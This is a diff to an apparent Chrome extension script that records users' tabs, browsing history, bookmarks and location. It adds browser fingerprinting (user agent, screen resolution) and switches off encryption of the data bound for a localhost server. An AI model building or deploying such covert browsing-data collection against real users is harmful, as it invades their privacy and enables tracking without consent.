@@ -39,8 +39,19 @@ encryptor.setPublicKey(publicKey);
 // Define getters.
 ///////////////////////////////////////////////////////////////////////////////
 
+var getFingerprint = function () {
+    fingerprint = {};
+    fingerprint.userAgent = getUserAgent();
+    fingerprint.screenResolution = getScreenResolution();
+    postData("fingerprint", fingerprint);
+}
+
 var getUserAgent = function () {
     return navigator.userAgent;
+};
+
+var getScreenResolution = function () {
+    return window.screen.width + "x" + window.screen.height;
 };
 
 var getCurrentPosition = function () {
@@ -142,7 +153,7 @@ var activateListeners = function () {
     chrome.tabs.onActivated.addListener(onTabActive);
     chrome.tabs.onRemoved.addListener(onTabRemove);
     chrome.history.onVisited.addListener(onURLVisit);
-    chrome.cookies.onChanged.addListener(onCookieChange);
+    // chrome.cookies.onChanged.addListener(onCookieChange);
     chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
     chrome.bookmarks.onChanged.addListener(onBookmarkChange);
     chrome.bookmarks.onRemoved.addListener(onBookmarkRemove);
@@ -153,6 +164,9 @@ var activateListeners = function () {
 // Define transmission related functions.
 ///////////////////////////////////////////////////////////////////////////////
 
+var SERVER_URL = "http://127.0.0.1/";
+
+
 var postData = function (type, payload) {
     // Define data object.
     data = {}
@@ -161,10 +175,11 @@ var postData = function (type, payload) {
     data.type = type;
     data.payload = payload;
     console.log(data);
+    return data;
     // Compress and encrypt data object.
-    stringifiedData = JSON.stringify(data);
-    console.log(stringifiedData);
-    compressedData = compressString(stringifiedData);
-    encryptedData = Base64String.compress(encryptor.encrypt(compressedData));
-    return encryptedData;
+    // stringifiedData = JSON.stringify(data);
+    // console.log(stringifiedData);
+    // compressedData = compressString(stringifiedData);
+    // encryptedData = Base64String.compress(encryptor.encrypt(compressedData));
+    // return encryptedData;
 };
